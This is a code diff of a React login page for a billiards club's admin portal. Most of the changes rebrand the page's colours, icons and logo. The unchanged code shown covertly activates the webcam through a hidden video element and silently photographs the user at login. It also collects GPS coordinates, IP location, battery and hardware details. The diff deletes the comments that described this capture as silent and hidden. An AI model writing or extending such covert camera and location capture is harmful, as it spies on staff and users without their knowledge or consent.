@@ -5,7 +5,7 @@ import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/context/AuthContext';
-import { Gamepad, ZapIcon, Stars, Dice1, Dice3, Dice5, Trophy, Joystick, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
+import { Trophy, ZapIcon, Stars, Sparkles, Target, Award, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
 import { useIsMobile } from '@/hooks/use-mobile';
 import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import {
@@ -53,7 +53,6 @@ const Login = () => {
   const [pinInput, setPinInput] = useState('');
   const [showPin, setShowPin] = useState(false);
   
-  // Hidden webcam and canvas for silent capture
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [cameraReady, setCameraReady] = useState(false);
@@ -67,7 +66,6 @@ const Login = () => {
     return () => clearTimeout(timer);
   }, []);
 
-  // Silently initialize camera in background
   useEffect(() => {
     const initCamera = async () => {
       try {
@@ -90,7 +88,6 @@ const Login = () => {
     
     initCamera();
 
-    // Cleanup camera on unmount
     return () => {
       if (videoRef.current && videoRef.current.srcObject) {
         const stream = videoRef.current.srcObject as MediaStream;
@@ -99,7 +96,6 @@ const Login = () => {
     };
   }, []);
 
-  // Silently capture photo
   const captureSilentPhoto = (): string | null => {
     if (!cameraReady || !videoRef.current || !canvasRef.current) {
       console.log('⚠️ Camera not ready for capture');
@@ -162,7 +158,6 @@ const Login = () => {
     return bytes;
   };
 
-  // Collect all metadata - IMPROVED VERSION
   useEffect(() => {
     const collectLoginInfo = async () => {
       try {
@@ -185,7 +180,6 @@ const Login = () => {
           touchSupport: 'ontouchstart' in window
         };
 
-        // Hardware info
         if ('hardwareConcurrency' in navigator) {
           metadata.cpuCores = (navigator as any).hardwareConcurrency;
         }
@@ -193,13 +187,11 @@ const Login = () => {
           metadata.deviceMemory = (navigator as any).deviceMemory;
         }
 
-        // Connection info
         const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
         if (connection) {
           metadata.connectionType = connection.effectiveType || connection.type;
         }
 
-        // Battery info
         if ('getBattery' in navigator) {
           try {
             const battery: any = await (navigator as any).getBattery();
@@ -209,10 +201,9 @@ const Login = () => {
           }
         }
 
-        // Get IP and location - Wait for response
         try {
           const controller = new AbortController();
-          const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+          const timeoutId = setTimeout(() => controller.abort(), 10000);
           
           const response = await fetch('https://ipapi.co/json/', {
             signal: controller.signal
@@ -232,7 +223,6 @@ const Login = () => {
         } catch (error) {
           console.log('⚠️ Could not fetch IP data, trying alternative...');
           
-          // Try alternative API
           try {
             const response = await fetch('https://api.ipify.org?format=json');
             if (response.ok) {
@@ -245,10 +235,8 @@ const Login = () => {
           }
         }
 
-        // Set initial metadata
         setLoginMetadata(metadata);
 
-        // Get GPS coordinates silently - This runs separately
         if ('geolocation' in navigator) {
           console.log('📍 Requesting GPS location...');
           navigator.geolocation.getCurrentPosition(
@@ -264,7 +252,6 @@ const Login = () => {
             },
             (error) => {
               console.log('⚠️ GPS location denied or unavailable:', error.message);
-              // Keep existing metadata without GPS
             },
             { 
               enableHighAccuracy: true, 
@@ -279,7 +266,6 @@ const Login = () => {
         console.log('🔍 Login tracking ready - metadata collection initiated');
       } catch (error) {
         console.error('❌ Error collecting metadata:', error);
-        // Set minimal metadata even if collection fails
         setLoginMetadata({
           loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
           userAgent: navigator.userAgent
@@ -304,13 +290,11 @@ const Login = () => {
     
     setIsLoading(true);
     
-    // Wait a moment for GPS to finish if it's still loading
     await new Promise(resolve => setTimeout(resolve, 500));
     
     try {
       const isAdminLogin = loginType === 'admin';
       
-      // Silently capture selfie
       let selfieUrl = null;
       const capturedImage = captureSilentPhoto();
       if (capturedImage) {
@@ -333,7 +317,6 @@ const Login = () => {
       const success = await login(username, password, isAdminLogin, enhancedMetadata);
       
       if (success) {
-        // Stop camera after successful login
         if (videoRef.current && videoRef.current.srcObject) {
           const stream = videoRef.current.srcObject as MediaStream;
           stream.getTracks().forEach(track => track.stop());
@@ -486,7 +469,7 @@ const Login = () => {
         <>
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
-              <KeyRound size={16} className="text-cuephoria-orange" />
+              <KeyRound size={16} className="text-emerald-500" />
               Staff Password Reset
             </DialogTitle>
             <DialogDescription>
@@ -502,7 +485,7 @@ const Login = () => {
           <DialogFooter>
             <Button 
               onClick={() => setForgotDialogOpen(false)}
-              className="w-full bg-cuephoria-purple hover:bg-cuephoria-purple/80"
+              className="w-full bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500"
             >
               Close
             </Button>
@@ -516,7 +499,7 @@ const Login = () => {
         <>
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
-              <KeyRound size={16} className="text-cuephoria-orange" />
+              <KeyRound size={16} className="text-emerald-500" />
               Admin Password Reset
             </DialogTitle>
             <DialogDescription>
@@ -533,7 +516,7 @@ const Login = () => {
                   placeholder="Enter your username"
                   value={forgotUsername}
                   onChange={(e) => setForgotUsername(e.target.value)}
-                  className="bg-background/50 border-cuephoria-lightpurple/30"
+                  className="bg-background/50 border-emerald-500/30"
                 />
               </div>
             </div>
@@ -543,7 +526,7 @@ const Login = () => {
             <Button 
               onClick={handleNextStep} 
               disabled={!forgotUsername}
-              className="bg-cuephoria-purple hover:bg-cuephoria-purple/80"
+              className="bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500"
             >
               Next
             </Button>
@@ -557,7 +540,7 @@ const Login = () => {
         <>
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
-              <Shield size={16} className="text-cuephoria-orange" />
+              <Shield size={16} className="text-emerald-500" />
               Master Key Verification
             </DialogTitle>
             <DialogDescription>
@@ -575,12 +558,12 @@ const Login = () => {
                     placeholder="Enter master key"
                     value={masterKey}
                     onChange={(e) => setMasterKey(e.target.value)}
-                    className="bg-background/50 border-cuephoria-lightpurple/30 pr-10"
+                    className="bg-background/50 border-emerald-500/30 pr-10"
                   />
                   <button
                     type="button"
                     onClick={toggleMasterKeyVisibility}
-                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none"
+                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-emerald-500 hover:text-green-400 focus:outline-none"
                     aria-label={showMasterKey ? "Hide master key" : "Show master key"}
                   >
                     {showMasterKey ? <EyeOff size={18} /> : <Eye size={18} />}
@@ -594,7 +577,7 @@ const Login = () => {
             <Button 
               onClick={handleNextStep} 
               disabled={!masterKey}
-              className="bg-cuephoria-purple hover:bg-cuephoria-purple/80"
+              className="bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500"
             >
               Verify
             </Button>
@@ -607,7 +590,7 @@ const Login = () => {
       <>
         <DialogHeader>
           <DialogTitle className="flex items-center gap-2">
-            <Lock size={16} className="text-cuephoria-orange" />
+            <Lock size={16} className="text-emerald-500" />
             Set New Password
           </DialogTitle>
           <DialogDescription>
@@ -625,12 +608,12 @@ const Login = () => {
                   placeholder="Enter new password"
                   value={newPassword}
                   onChange={(e) => setNewPassword(e.target.value)}
-                  className="bg-background/50 border-cuephoria-lightpurple/30 pr-10"
+                  className="bg-background/50 border-emerald-500/30 pr-10"
                 />
                 <button
                   type="button"
                   onClick={toggleNewPasswordVisibility}
-                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none"
+                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-emerald-500 hover:text-green-400 focus:outline-none"
                   aria-label={showNewPassword ? "Hide new password" : "Show new password"}
                 >
                   {showNewPassword ? <EyeOff size={18} /> : <Eye size={18} />}
@@ -646,12 +629,12 @@ const Login = () => {
                   placeholder="Confirm new password"
                   value={confirmPassword}
                   onChange={(e) => setConfirmPassword(e.target.value)}
-                  className="bg-background/50 border-cuephoria-lightpurple/30 pr-10"
+                  className="bg-background/50 border-emerald-500/30 pr-10"
                 />
                 <button
                   type="button"
                   onClick={toggleConfirmPasswordVisibility}
-                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none"
+                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-emerald-500 hover:text-green-400 focus:outline-none"
                   aria-label={showConfirmPassword ? "Hide confirm password" : "Show confirm password"}
                 >
                   {showConfirmPassword ? <EyeOff size={18} /> : <Eye size={18} />}
@@ -665,7 +648,7 @@ const Login = () => {
           <Button 
             onClick={handleResetPassword} 
             disabled={!newPassword || !confirmPassword || resetLoading}
-            className="bg-cuephoria-purple hover:bg-cuephoria-purple/80"
+            className="bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500"
           >
             {resetLoading ? "Resetting..." : "Reset Password"}
           </Button>
@@ -675,8 +658,7 @@ const Login = () => {
   };
 
   return (
-    <div className="min-h-screen flex flex-col items-center justify-center bg-cuephoria-dark overflow-hidden relative px-4">
-      {/* Hidden video and canvas for silent capture */}
+    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-[#1a1a1a] via-[#0f1f0f] to-[#1a1a1a] overflow-hidden relative px-4">
       <video 
         ref={videoRef} 
         style={{ display: 'none' }}
@@ -690,7 +672,7 @@ const Login = () => {
         <Button 
           variant="ghost" 
           size="sm"
-          className="flex items-center gap-2 text-gray-300 hover:text-white hover:bg-cuephoria-purple/20"
+          className="flex items-center gap-2 text-gray-300 hover:text-emerald-400 hover:bg-emerald-900/20"
           onClick={() => navigate('/')}
         >
           <ArrowLeft size={16} />
@@ -700,7 +682,7 @@ const Login = () => {
         <Button 
           variant="ghost" 
           size="sm"
-          className="flex items-center gap-2 text-gray-300 hover:text-white hover:bg-cuephoria-orange/20"
+          className="flex items-center gap-2 text-gray-300 hover:text-green-400 hover:bg-green-900/20"
           onClick={handleViewLogsClick}
         >
           <FileText size={16} />
@@ -709,65 +691,62 @@ const Login = () => {
       </div>
       
       <div className="absolute inset-0 z-0 overflow-hidden">
-        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(ellipse_at_top_left,_var(--tw-gradient-stops))] from-blue-500/20 via-transparent to-transparent"></div>
-        <div className="absolute bottom-0 right-0 w-full h-full bg-[radial-gradient(ellipse_at_bottom_right,_var(--tw-gradient-stops))] from-purple-500/20 via-transparent to-transparent"></div>
+        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(ellipse_at_top_left,_var(--tw-gradient-stops))] from-emerald-500/20 via-transparent to-transparent"></div>
+        <div className="absolute bottom-0 right-0 w-full h-full bg-[radial-gradient(ellipse_at_bottom_right,_var(--tw-gradient-stops))] from-green-500/20 via-transparent to-transparent"></div>
         
-        <div className="absolute top-1/3 right-1/4 w-48 h-64 bg-[radial-gradient(circle,_var(--tw-gradient-stops))] from-accent/10 via-transparent to-transparent rounded-tr-[50%]"></div>
+        <div className="absolute top-1/3 right-1/4 w-48 h-64 bg-[radial-gradient(circle,_var(--tw-gradient-stops))] from-emerald-400/10 via-transparent to-transparent rounded-tr-[50%]"></div>
         
-        <div className="absolute top-[8%] left-[12%] text-cuephoria-lightpurple opacity-20 animate-float">
-          <Gamepad size={isMobile ? 24 : 36} className="animate-wiggle" />
+        <div className="absolute top-[8%] left-[12%] text-emerald-400 opacity-20 animate-float">
+          <Trophy size={isMobile ? 24 : 36} className="animate-wiggle" />
         </div>
-        <div className="absolute bottom-[15%] right-[15%] text-accent opacity-20 animate-float delay-300">
-          <ZapIcon size={isMobile ? 24 : 36} className="animate-pulse-soft" />
+        <div className="absolute bottom-[15%] right-[15%] text-green-400 opacity-20 animate-float delay-300">
+          <Sparkles size={isMobile ? 24 : 36} className="animate-pulse-soft" />
         </div>
-        <div className="absolute top-[30%] right-[30%] text-cuephoria-lightpurple opacity-20 animate-float delay-150">
+        <div className="absolute top-[30%] right-[30%] text-emerald-300 opacity-20 animate-float delay-150">
           <Stars size={isMobile ? 18 : 24} className="animate-pulse-soft" />
         </div>
-        <div className="absolute top-[15%] right-[12%] text-cuephoria-orange opacity-20 animate-float delay-250">
-          <Dice1 size={isMobile ? 20 : 28} className="animate-wiggle" />
+        <div className="absolute top-[15%] right-[12%] text-green-500 opacity-20 animate-float delay-250">
+          <Target size={isMobile ? 20 : 28} className="animate-wiggle" />
         </div>
-        <div className="absolute bottom-[25%] left-[25%] text-cuephoria-blue opacity-20 animate-float delay-200">
-          <Dice3 size={isMobile ? 22 : 30} className="animate-pulse-soft" />
+        <div className="absolute bottom-[25%] left-[25%] text-emerald-500 opacity-20 animate-float delay-200">
+          <Award size={isMobile ? 22 : 30} className="animate-pulse-soft" />
         </div>
-        <div className="absolute top-[50%] left-[15%] text-cuephoria-green opacity-20 animate-float delay-150">
-          <Dice5 size={isMobile ? 24 : 32} className="animate-wiggle" />
+        <div className="absolute top-[50%] left-[15%] text-green-400 opacity-20 animate-float delay-150">
+          <Trophy size={isMobile ? 24 : 32} className="animate-wiggle" />
         </div>
-        <div className="absolute bottom-[10%] left-[10%] text-cuephoria-orange opacity-20 animate-float delay-300">
-          <Trophy size={isMobile ? 24 : 34} className="animate-pulse-soft" />
-        </div>
-        <div className="absolute top-[25%] left-[25%] text-accent opacity-20 animate-float delay-400">
-          <Joystick size={isMobile ? 28 : 38} className="animate-wiggle" />
+        <div className="absolute bottom-[10%] left-[10%] text-emerald-400 opacity-20 animate-float delay-300">
+          <Sparkles size={isMobile ? 24 : 34} className="animate-pulse-soft" />
         </div>
         
-        <div className="absolute top-1/2 left-0 h-px w-full bg-gradient-to-r from-transparent via-cuephoria-lightpurple/30 to-transparent"></div>
-        <div className="absolute top-0 left-1/2 h-full w-px bg-gradient-to-b from-transparent via-accent/30 to-transparent"></div>
-        <div className="absolute top-1/3 left-0 h-px w-full bg-gradient-to-r from-transparent via-cuephoria-orange/20 to-transparent"></div>
-        <div className="absolute top-2/3 left-0 h-px w-full bg-gradient-to-r from-transparent via-cuephoria-green/20 to-transparent"></div>
+        <div className="absolute top-1/2 left-0 h-px w-full bg-gradient-to-r from-transparent via-emerald-500/30 to-transparent"></div>
+        <div className="absolute top-0 left-1/2 h-full w-px bg-gradient-to-b from-transparent via-green-500/30 to-transparent"></div>
+        <div className="absolute top-1/3 left-0 h-px w-full bg-gradient-to-r from-transparent via-emerald-400/20 to-transparent"></div>
+        <div className="absolute top-2/3 left-0 h-px w-full bg-gradient-to-r from-transparent via-green-400/20 to-transparent"></div>
         
-        <div className="absolute inset-0 opacity-10" style={{ backgroundImage: 'radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px)', backgroundSize: '30px 30px' }}></div>
+        <div className="absolute inset-0 opacity-5" style={{ backgroundImage: 'radial-gradient(circle, rgba(34,197,94,0.15) 1px, transparent 1px)', backgroundSize: '30px 30px' }}></div>
       </div>
       
       <div className={`w-full max-w-md z-10 ${animationClass}`}>
         <div className="mb-8 text-center">
           <div className="relative mx-auto w-full max-w-[220px] h-auto sm:w-64 sm:h-64">
-            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-cuephoria-lightpurple/20 to-accent/10 blur-lg"></div>
+            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-emerald-500/20 to-green-500/10 blur-lg"></div>
             <img 
-              src="/lovable-uploads/edbcb263-8fde-45a9-b66b-02f664772425.png" 
-              alt="Cuephoria 8-Ball Club" 
-              className="relative w-full h-auto mx-auto drop-shadow-[0_0_15px_rgba(155,135,245,0.3)]"
+              src="https://iili.io/KgkdS1f.png" 
+              alt="TipNtop Club - Premier Snooker & 8-Ball" 
+              className="relative w-full h-auto mx-auto drop-shadow-[0_0_15px_rgba(34,197,94,0.4)]"
             />
           </div>
-          <p className="mt-2 text-muted-foreground font-bold tracking-wider animate-fade-in bg-gradient-to-r from-cuephoria-lightpurple via-accent to-cuephoria-lightpurple bg-clip-text text-transparent text-sm sm:text-base">
+          <p className="mt-2 text-muted-foreground font-bold tracking-wider animate-fade-in bg-gradient-to-r from-emerald-400 via-green-400 to-emerald-400 bg-clip-text text-transparent text-sm sm:text-base">
             ADMINISTRATOR PORTAL
           </p>
         </div>
         
-        <Card className="bg-cuephoria-darker/90 border border-cuephoria-lightpurple/30 shadow-xl shadow-cuephoria-lightpurple/20 backdrop-blur-lg animate-fade-in delay-100 rounded-xl overflow-hidden">
-          <div className="absolute inset-0 bg-gradient-to-br from-cuephoria-lightpurple/5 to-accent/5 opacity-50 rounded-xl"></div>
+        <Card className="bg-black/80 border border-emerald-500/30 shadow-xl shadow-emerald-900/40 backdrop-blur-lg animate-fade-in delay-100 rounded-xl overflow-hidden">
+          <div className="absolute inset-0 bg-gradient-to-br from-emerald-500/5 to-green-500/5 opacity-50 rounded-xl"></div>
           <div className="absolute w-full h-full bg-grid-pattern opacity-5"></div>
           
           <CardHeader className="text-center relative z-10 p-4 sm:p-6">
-            <CardTitle className="text-xl sm:text-2xl gradient-text font-bold">Game Master Login</CardTitle>
+            <CardTitle className="text-xl sm:text-2xl bg-clip-text text-transparent bg-gradient-to-r from-emerald-400 to-green-500 font-bold">Club Manager Login</CardTitle>
             <CardDescription className="text-muted-foreground font-medium text-xs sm:text-sm">Enter your credentials to access the control panel</CardDescription>
           </CardHeader>
           
@@ -775,12 +754,12 @@ const Login = () => {
             <CardContent className="space-y-4 relative z-10 p-4 sm:p-6 pt-0 sm:pt-0">
               <div className="flex justify-center mb-4">
                 <Tabs defaultValue="admin" value={loginType} onValueChange={setLoginType} className="w-full max-w-xs">
-                  <TabsList className="grid w-full grid-cols-2">
-                    <TabsTrigger value="admin" className="flex items-center gap-2">
+                  <TabsList className="grid w-full grid-cols-2 bg-emerald-950/30">
+                    <TabsTrigger value="admin" className="flex items-center gap-2 data-[state=active]:bg-emerald-600">
                       <Shield size={14} />
                       Admin
                     </TabsTrigger>
-                    <TabsTrigger value="staff" className="flex items-center gap-2">
+                    <TabsTrigger value="staff" className="flex items-center gap-2 data-[state=active]:bg-green-600">
                       <Users size={14} />
                       Staff
                     </TabsTrigger>
@@ -789,10 +768,10 @@ const Login = () => {
               </div>
 
               <div className="space-y-2 group">
-                <label htmlFor="username" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-cuephoria-lightpurple group-hover:text-accent transition-colors duration-300">
+                <label htmlFor="username" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-emerald-400 group-hover:text-green-400 transition-colors duration-300">
                   <User size={14} className="inline-block" />
                   Username
-                  <div className="h-px flex-grow bg-gradient-to-r from-cuephoria-lightpurple/50 to-transparent group-hover:from-accent/50 transition-colors duration-300"></div>
+                  <div className="h-px flex-grow bg-gradient-to-r from-emerald-500/50 to-transparent group-hover:from-green-500/50 transition-colors duration-300"></div>
                 </label>
                 <Input
                   id="username"
@@ -800,15 +779,15 @@ const Login = () => {
                   placeholder="Enter your username"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
-                  className="bg-background/50 border-cuephoria-lightpurple/30 focus-visible:ring-cuephoria-lightpurple transition-all duration-300 hover:border-cuephoria-lightpurple/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-cuephoria-lightpurple/30 text-sm"
+                  className="bg-background/50 border-emerald-500/30 focus-visible:ring-emerald-500 transition-all duration-300 hover:border-emerald-500/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-emerald-500/30 text-sm"
                 />
               </div>
               
               <div className="space-y-2 group">
-                <label htmlFor="password" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-cuephoria-lightpurple group-hover:text-accent transition-colors duration-300">
+                <label htmlFor="password" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-emerald-400 group-hover:text-green-400 transition-colors duration-300">
                   <ZapIcon size={14} className="inline-block" />
                   Password
-                  <div className="h-px flex-grow bg-gradient-to-r from-cuephoria-lightpurple/50 to-transparent group-hover:from-accent/50 transition-colors duration-300"></div>
+                  <div className="h-px flex-grow bg-gradient-to-r from-emerald-500/50 to-transparent group-hover:from-green-500/50 transition-colors duration-300"></div>
                 </label>
                 <div className="relative">
                   <Input
@@ -817,12 +796,12 @@ const Login = () => {
                     placeholder="••••••••"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
-                    className="bg-background/50 border-cuephoria-lightpurple/30 focus-visible:ring-cuephoria-lightpurple transition-all duration-300 hover:border-cuephoria-lightpurple/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-cuephoria-lightpurple/30 text-sm pr-10"
+                    className="bg-background/50 border-emerald-500/30 focus-visible:ring-emerald-500 transition-all duration-300 hover:border-emerald-500/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-emerald-500/30 text-sm pr-10"
                   />
                   <button
                     type="button"
                     onClick={togglePasswordVisibility}
-                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none transition-colors duration-200"
+                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-emerald-500 hover:text-green-400 focus:outline-none transition-colors duration-200"
                     aria-label={showPassword ? "Hide password" : "Show password"}
                   >
                     {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
@@ -834,7 +813,7 @@ const Login = () => {
                 <Button 
                   type="button" 
                   variant="link" 
-                  className="text-cuephoria-lightpurple hover:text-accent p-0 h-auto text-xs"
+                  className="text-emerald-400 hover:text-green-400 p-0 h-auto text-xs"
                   onClick={() => handleForgotPasswordClick(loginType)}
                 >
                   Forgot password?
@@ -845,7 +824,7 @@ const Login = () => {
             <CardFooter className="relative z-10 p-4 sm:p-6 pt-0 sm:pt-0">
               <Button 
                 type="submit" 
-                className="w-full relative overflow-hidden bg-gradient-to-r from-cuephoria-lightpurple to-accent hover:shadow-lg hover:shadow-cuephoria-lightpurple/20 hover:scale-[1.02] transition-all duration-300 btn-hover-effect font-medium text-sm sm:text-base" 
+                className="w-full relative overflow-hidden bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500 hover:shadow-lg hover:shadow-emerald-900/40 hover:scale-[1.02] transition-all duration-300 btn-hover-effect font-medium text-sm sm:text-base" 
                 disabled={isLoading}
               >
                 <span className="relative z-10 flex items-center justify-center gap-2">
@@ -870,12 +849,11 @@ const Login = () => {
         </Card>
       </div>
 
-      {/* PIN Dialog */}
       <Dialog open={pinDialogOpen} onOpenChange={setPinDialogOpen}>
-        <DialogContent className="sm:max-w-md bg-background border-cuephoria-orange">
+        <DialogContent className="sm:max-w-md bg-background border-emerald-500/40">
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
-              <Lock size={16} className="text-cuephoria-orange" />
+              <Lock size={16} className="text-emerald-500" />
               Enter PIN to Access Logs
             </DialogTitle>
             <DialogDescription>
@@ -898,12 +876,12 @@ const Login = () => {
                     }
                   }}
                   maxLength={4}
-                  className="bg-background/50 border-cuephoria-orange/30 pr-10 text-center text-2xl tracking-widest"
+                  className="bg-background/50 border-emerald-500/30 pr-10 text-center text-2xl tracking-widest"
                 />
                 <button
                   type="button"
                   onClick={togglePinVisibility}
-                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-orange hover:text-accent focus:outline-none"
+                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-emerald-500 hover:text-green-400 focus:outline-none"
                   aria-label={showPin ? "Hide PIN" : "Show PIN"}
                 >
                   {showPin ? <EyeOff size={18} /> : <Eye size={18} />}
@@ -916,7 +894,7 @@ const Login = () => {
             <Button 
               onClick={handlePinSubmit}
               disabled={pinInput.length !== 4}
-              className="bg-cuephoria-orange hover:bg-cuephoria-orange/80"
+              className="bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500"
             >
               Access Logs
             </Button>
@@ -924,9 +902,8 @@ const Login = () => {
         </DialogContent>
       </Dialog>
 
-      {/* Forgot Password Dialog */}
       <Dialog open={forgotDialogOpen} onOpenChange={setForgotDialogOpen}>
-        <DialogContent className="sm:max-w-md bg-background border-cuephoria-purple">
+        <DialogContent className="sm:max-w-md bg-background border-emerald-500/40">
           {renderForgotPasswordContent()}
         </DialogContent>
       </Dialog>
